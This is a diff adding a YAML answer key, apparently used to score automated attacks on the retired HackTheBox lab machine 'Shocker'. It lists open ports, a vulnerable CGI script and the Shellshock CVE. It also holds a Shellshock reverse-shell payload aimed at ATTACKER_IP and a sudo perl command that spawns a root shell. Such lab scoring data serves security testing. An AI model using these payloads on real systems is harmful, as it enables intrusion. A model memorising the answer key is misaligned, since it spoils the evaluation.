@@ -1,0 +1,53 @@
+name: Shocker
+ip: "10.10.10.56"
+os: Linux
+difficulty: Easy
+htb_id: 108
+retired: true
+
+# Ground truth from writeups — used for validation scoring
+ground_truth:
+  ports:
+    - port: 80
+      service: http
+      product: Apache httpd 2.4.18
+    - port: 2222
+      service: ssh
+      product: OpenSSH 7.2p2
+
+  attack_surface:
+    - path: "/cgi-bin/"
+      discovery_method: "gobuster/dirb"
+    - path: "/cgi-bin/user.sh"
+      discovery_method: "gobuster with .sh,.cgi,.pl extensions"
+
+  vulnerability:
+    name: "Shellshock"
+    cve: "CVE-2014-6271"
+    type: "Remote Code Execution"
+    location: "/cgi-bin/user.sh"
+    description: "Bash Shellshock vulnerability in CGI script"
+
+  initial_access:
+    method: "Shellshock RCE via User-Agent header"
+    payload_example: "() { :;}; /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"
+    shell_user: "shelly"
+
+  privesc:
+    method: "sudo perl"
+    discovery: "sudo -l reveals (root) NOPASSWD: /usr/bin/perl"
+    command: "sudo perl -e 'exec \"/bin/bash\";'"
+
+  flags:
+    user: "user.txt located in /home/shelly/"
+    root: "root.txt located in /root/"
+
+  mitre_attack:
+    - tactic: "Reconnaissance"
+      technique: "T1046 - Network Service Discovery"
+    - tactic: "Initial Access"
+      technique: "T1190 - Exploit Public-Facing Application"
+    - tactic: "Execution"
+      technique: "T1059.004 - Unix Shell"
+    - tactic: "Privilege Escalation"
+      technique: "T1548.003 - Sudo and Sudo Caching"
